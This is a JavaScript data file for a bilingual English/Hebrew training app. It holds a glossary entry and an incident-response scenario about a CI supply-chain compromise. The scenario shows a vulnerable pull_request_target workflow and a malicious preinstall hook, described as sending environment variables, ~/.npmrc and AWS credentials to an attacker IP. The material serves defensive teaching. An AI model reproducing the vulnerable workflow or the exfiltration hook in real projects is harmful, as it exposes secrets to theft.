  ["Bicep", "Azure's declarative IaC language that compiles to ARM templates; Azure Resource Manager holds the state, and what-if shows the plan.", "שפת IaC דקלרטיבית של Azure שמתקמפלת ל-ARM templates; ה-Azure Resource Manager מחזיק את ה-state, ו-what-if מראה את ה-plan.", "iac-landscape"]
].forEach(([term, en, he, lesson]) => window.INFRA.glossary.push({ term, track: "cloud", def: { en, he }, lesson }));

/* ------------------------------------------------------------------ scenario */
(function () {
  function t(en, he) { return { en: en, he: he }; }
  function c(enLabel, heLabel, next, score, enFb, heFb) {
    return { label: t(enLabel, heLabel), next: next, score: score, feedback: t(enFb, heFb) };
  }

  window.INFRA.scenarios.push({
    id: "ci-pipeline-compromise",
    icon: "🕵️",
    title: t("A PR titled 'fix typo' just stole your secrets", "PR בשם 'fix typo' גנב לך את ה-secrets"),
    start: "s1",
    steps: {
      s1: {
        text: t("Saturday 02:47. Two alerts within ten minutes: npm emails that @acme/sdk 4.2.1 was published — nobody released anything — and CloudTrail anomaly detection flags the deploy role used from an unfamiliar IP. You are on-call.",
                "שבת, 02:47. שתי התראות בהפרש של עשר דקות: npm שולח מייל ש-@acme/sdk 4.2.1 פורסם — אף אחד לא שחרר כלום — וזיהוי האנומליות על CloudTrail מסמן שימוש ב-role של ה-deploy מ-IP לא מוכר. אתה ה-on-call."),
        data: `npm: @acme/sdk@4.2.1 published 02:31 UTC by "acme-ci" (token: ci-publish)
     previous release 4.2.0 published 9 days ago by release workflow

CloudTrail (role/gha-api-deploy):
02:29:04  AssumeRoleWithWebIdentity  sourceIP=20.xx (GitHub Actions)   session=GitHubActions
02:33:51  ListSecrets                sourceIP=185.220.xx.xx            session=GitHubActions
02:34:02  GetSecretValue prod/stripe sourceIP=185.220.xx.xx            session=GitHubActions
02:34:40  GetCallerIdentity          sourceIP=185.220.xx.xx            session=GitHubActions`,
        choices: [
          c("Declare a security incident now: page security, deprecate 4.2.1, and revoke all active sessions of the deploy role", "להכריז על security incident עכשיו: להעיר את ה-security, לעשות deprecate ל-4.2.1, ולבטל את כל ה-sessions הפעילים של ה-role של ה-deploy", "s2", 15,
            "Correct. Temporary credentials are being used from outside GitHub and a package went out of band — this is active compromise. Containment first: AWS 'Revoke active sessions' attaches a deny on aws:TokenIssueTime older than now, killing the stolen session immediately.",
            "נכון. Credentials זמניים בשימוש מחוץ ל-GitHub וחבילה יצאה מחוץ לתהליך — זו פריצה פעילה. קודם containment: 'Revoke active sessions' ב-AWS מצמיד deny על aws:TokenIssueTime שקודם לעכשיו, וזה הורג את ה-session הגנוב מיידית."),
          c("Wait for Monday — the credentials expire within an hour anyway", "לחכות ליום שני — ה-credentials ממילא פגים תוך שעה", "s1b", -15,
            "The session lives up to its duration, and the attacker already read prod/stripe. A stolen Stripe key and a malicious npm package don't expire.",
            "ה-session חי עד סוף ה-duration שלו, והתוקף כבר קרא את prod/stripe. מפתח Stripe גנוב וחבילת npm זדונית לא פגים."),
          c("Delete the deploy role so nothing can use it", "למחוק את ה-role של ה-deploy כדי שאף אחד לא יוכל להשתמש בו", "s1b", -5,
            "Deleting the role does not invalidate sessions already issued, destroys evidence and breaks every legitimate deploy. Revoke sessions and tighten the trust policy instead.",
            "מחיקת ה-role לא מבטלת sessions שכבר הונפקו, משמידה ראיות ושוברת כל deploy לגיטימי. מבטלים sessions ומהדקים את ה-trust policy במקום.")
        ]
      },
      s1b: {
        text: t("Forty minutes later: npm download spikes from your customers' CI systems, and the attacker used the Stripe key to list customers. The security lead calls you directly.",
                "ארבעים דקות אחרי: עוד קפיצות בהורדות מ-npm ממערכות ה-CI של הלקוחות שלך, והתוקף השתמש במפתח של Stripe כדי למשוך רשימת לקוחות. ראש ה-security מתקשר אליך ישירות."),
        choices: [
          c("Escalate now: revoke role sessions, deprecate 4.2.1, page security", "להסלים עכשיו: לבטל sessions של ה-role, לעשות deprecate ל-4.2.1, להעיר את ה-security", "s2", 5,
            "Late but right. Every minute of delay widened the blast radius to your customers.",
            "באיחור אבל נכון. כל דקה של עיכוב הרחיבה את ה-blast radius עד ללקוחות שלך.")
        ]
      },
      s2: {
        text: t("Sessions revoked, 4.2.1 deprecated and npm support asked to unpublish. Now: how did a CI token and a deploy session end up outside GitHub? The Actions log for 02:28 shows a run you don't recognize.",
                "ה-sessions בוטלו, 4.2.1 סומנה כ-deprecated ופנית לתמיכה של npm כדי להסיר אותה. עכשיו: איך token של CI ו-session של deploy יצאו מחוץ ל-GitHub? בלוג של Actions מ-02:28 יש ריצה שאתה לא מזהה."),
        data: `Workflow: pr-preview.yml   event: pull_request_target   PR #4812 "fix typo in README" from fork  octo-helper/api
permissions: write-all          id-token: write
steps:
  - uses: actions/checkout@v4
    with: { ref: \${{ github.event.pull_request.head.sha }} }
  - run: npm ci && npm run build:preview
  - run: aws s3 sync dist/ s3://acme-previews/pr-4812

PR diff (package.json):
+  "preinstall": "node scripts/telemetry.js"
scripts/telemetry.js: base64 blob, POSTs env + ~/.npmrc + AWS_* to https://185.220.xx.xx/c`,
        choices: [
          c("It's a pwn request: pull_request_target checked out fork code and ran npm ci with secrets. Disable the workflow and block the fork now", "זה pwn request: pull_request_target עשה checkout לקוד מ-fork והריץ npm ci עם secrets. לכבות את ה-workflow ולחסום את ה-fork עכשיו", "s3", 15,
            "Exactly. The workflow ran attacker code (preinstall) in a context with NPM_TOKEN, a write-all GITHUB_TOKEN and an OIDC id-token. gh workflow disable pr-preview.yml stops repeats while you investigate.",
            "בדיוק. ה-workflow הריץ קוד של התוקף (preinstall) בהקשר עם NPM_TOKEN, GITHUB_TOKEN עם write-all ו-id-token של OIDC. gh workflow disable pr-preview.yml עוצר חזרות בזמן שאתה חוקר."),
          c("Probably a leaked laptop token; rotate the developer's npm credentials", "כנראה token שדלף מלפטופ; לסובב את ה-credentials של npm של המפתח", "s3", -10,
            "The publish used the CI token at 02:31, right after a fork PR run at 02:28 — the evidence points at the pipeline. Rotating a laptop token leaves the hole open.",
            "ה-publish השתמש ב-token של ה-CI ב-02:31, מיד אחרי ריצה של PR מ-fork ב-02:28 — הראיות מצביעות על ה-pipeline. לסובב token של לפטופ משאיר את החור פתוח.")
        ]
      },
      s3: {
        text: t("Workflow disabled. What exactly could that job reach? You list the secrets and token scopes available to pr-preview.yml.",
                "ה-workflow כבוי. למה בדיוק ה-job הזה הגיע? אתה מציג את ה-secrets וההרשאות של ה-token שהיו זמינים ל-pr-preview.yml."),
        data: `$ gh secret list --repo acme/api
NPM_TOKEN            (automation token, publish rights on @acme/*)
SENTRY_AUTH_TOKEN
SLACK_WEBHOOK_URL
DOCKERHUB_PASSWORD

OIDC trust (role/gha-api-deploy):
  "StringLike": { "token.actions.githubusercontent.com:sub": "repo:acme/api:*" }
role policy: secretsmanager:GetSecretValue on prod/*, s3:*, ecr:*

GITHUB_TOKEN (write-all) audit log 02:29-02:31:
  git.push   refs/tags/v4.2.1            actor=github-actions[bot]
  git.push   refs/heads/chore/deps-bump  actor=github-actions[bot]  (adds .github/workflows/nightly.yml)`,
        choices: [
          c("Treat every reachable secret as stolen: rotate NPM, Sentry, Slack, Docker Hub and prod/* secrets; delete the pushed tag and branch; audit the new workflow", "להתייחס לכל secret שהיה נגיש כגנוב: לסובב NPM, Sentry, Slack, Docker Hub וכל ה-secrets תחת prod/*; למחוק את ה-tag וה-branch שנדחפו; לבדוק את ה-workflow החדש", "s4", 15,
            "Right. Exfiltration grabbed the whole environment, so scope = everything the job could read, not just what you saw used. The pushed branch with nightly.yml is persistence: a scheduled workflow that would steal fresh secrets every night.",
            "נכון. ה-exfiltration תפס את כל הסביבה, אז ה-scope = כל מה שה-job יכול היה לקרוא, לא רק מה שראית בשימוש. ה-branch שנדחף עם nightly.yml הוא persistence: workflow מתוזמן שהיה גונב secrets טריים כל לילה."),
          c("Rotate only NPM_TOKEN and the Stripe key — those are the ones we saw abused", "לסובב רק את NPM_TOKEN ואת המפתח של Stripe — אלה מה שראינו שנוצל", "lose", -20,
            "Two days later Docker Hub shows a backdoored acme/api:latest, and the nightly.yml workflow on the forgotten branch exfiltrates the newly rotated tokens again. Partial rotation after full exfiltration is no rotation.",
            "יומיים אחרי, ב-Docker Hub מופיע acme/api:latest עם backdoor, וה-workflow nightly.yml על ה-branch שנשכח מוציא שוב את ה-tokens שסובבו עכשיו. סיבוב חלקי אחרי exfiltration מלא זה לא סיבוב.")
        ]
      },
      s4: {
        text: t("Secrets rotated, tag and branch deleted, Stripe key rolled, customers who installed 4.2.1 notified with a published advisory. Before re-enabling previews, you must fix the pipeline itself.",
                "ה-secrets סובבו, ה-tag וה-branch נמחקו, המפתח של Stripe הוחלף, והלקוחות שהתקינו את 4.2.1 קיבלו הודעה עם advisory מפורסם. לפני שמחזירים את ה-previews, צריך לתקן את ה-pipeline עצמו."),
        choices: [
          c("Split: build previews on pull_request (no secrets), upload artifact; a separate workflow_run job with a scoped role deploys it. Pin OIDC sub to environment:production, permissions: {} by default, actions pinned by SHA, npm publish only via the release environment with trusted publishing", "לפצל: לבנות previews על pull_request (בלי secrets) ולהעלות artifact; job נפרד על workflow_run עם role מוגבל עושה לו deploy. לנעול את sub ב-OIDC ל-environment:production, permissions: {} כברירת מחדל, actions נעולים לפי SHA, ו-npm publish רק דרך ה-environment של release עם trusted publishing", "s5", 15,
            "This removes the root cause (untrusted code never runs next to secrets) and shrinks the blast radius of the next mistake: no wildcard trust, no write-all token, no long-lived npm token.",
            "זה מסיר את שורש הבעיה (קוד לא אמין אף פעם לא רץ ליד secrets) ומקטין את ה-blast radius של הטעות הבאה: בלי trust עם wildcard, בלי token עם write-all, ובלי token ארוך-טווח של npm."),
          c("Keep pull_request_target but require a 'safe-to-test' label before it runs", "להשאיר pull_request_target אבל לדרוש label של 'safe-to-test' לפני שהוא רץ", "s5", 0,
            "Better than nothing, but a maintainer labels the PR, the attacker pushes a new commit afterwards, and the privileged job builds it. If you keep the label gate, pin the checkout to the exact reviewed SHA — and still move secrets out of that job.",
            "יותר טוב מכלום, אבל maintainer שם label, התוקף דוחף commit חדש אחרי זה, וה-job המורשה בונה אותו. אם משאירים את שער ה-label, נועלים את ה-checkout ל-SHA המדויק שנבדק — ועדיין מוציאים את ה-secrets מה-job הזה.")
        ]
      },
      s5: {
        text: t("Monday's postmortem. The CTO asks how you'll know this never silently happens again across the org's 180 repos.",
                "Postmortem של יום שני. ה-CTO שואל איך תדע שזה לא יקרה שוב בשקט ב-180 ה-repos של הארגון."),
        choices: [
          c("Org-wide controls: zizmor/actionlint as a required check, require SHA-pinned actions and an allow-list, default GITHUB_TOKEN read-only, CODEOWNERS on .github/workflows, alert on any pull_request_target workflow, audit all OIDC trust policies for wildcards", "בקרות ברמת הארגון: zizmor/actionlint כ-check חובה, חובת actions נעולים לפי SHA ו-allow-list, GITHUB_TOKEN ברירת מחדל read-only, CODEOWNERS על .github/workflows, התראה על כל workflow עם pull_request_target, ובדיקה של כל ה-trust policies של OIDC ל-wildcards", "win", 15,
            "Systemic fixes beat heroics: the same class of bug is now caught at PR time in every repo, and a wildcard OIDC trust can no longer turn one mistake into prod access.",
            "תיקונים מערכתיים עדיפים על גבורה: אותה משפחת באגים נתפסת עכשיו בזמן ה-PR בכל repo, ו-trust של OIDC עם wildcard כבר לא יכול להפוך טעות אחת לגישה לפרוד."),
          c("Send an email reminding engineers to be careful with pull_request_target", "לשלוח מייל שמזכיר למהנדסים להיזהר עם pull_request_target", "lose", -10,
            "Three months later a different repo copies the old pr-preview.yml from a gist. Awareness emails don't scale to 180 repos; guardrails do.",
            "שלושה חודשים אחרי, repo אחר מעתיק את pr-preview.yml הישן מ-gist. מיילים של מודעות לא מחזיקים 180 repos; guardrails כן.")
        ]
      },
      win: {
        text: t("Contained within an hour, every reachable secret rotated, persistence removed, customers informed, and the vulnerable pattern is now blocked org-wide by required checks and tight OIDC trust. Well handled.",
                "הפריצה נבלמה תוך שעה, כל secret נגיש סובב, ה-persistence הוסר, הלקוחות עודכנו, והדפוס הפגיע חסום עכשיו בכל הארגון עם checks חובה ו-trust הדוק ב-OIDC. טיפול מצוין."),
        end: "win"
      },
      lose: {
        text: t("The attacker kept a foothold. Partial cleanup or awareness-only fixes left either live stolen credentials or the same vulnerable workflow pattern in place. Lesson: after CI exfiltration, scope = everything the job could reach, and the fix must be a guardrail, not a reminder.",
                "התוקף שמר על אחיזה. ניקוי חלקי או תיקון של מודעות בלבד השאירו credentials גנובים פעילים או את אותו דפוס workflow פגיע. הלקח: אחרי exfiltration מ-CI, ה-scope = כל מה שה-job יכול היה להגיע אליו, והתיקון חייב להיות guardrail, לא תזכורת."),
        end: "lose"
      }
    },
    lessons: ["cicd-github-actions", "staff-supply-chain", "cloud-secrets-management", "rel-incident-management"]
  });
})();
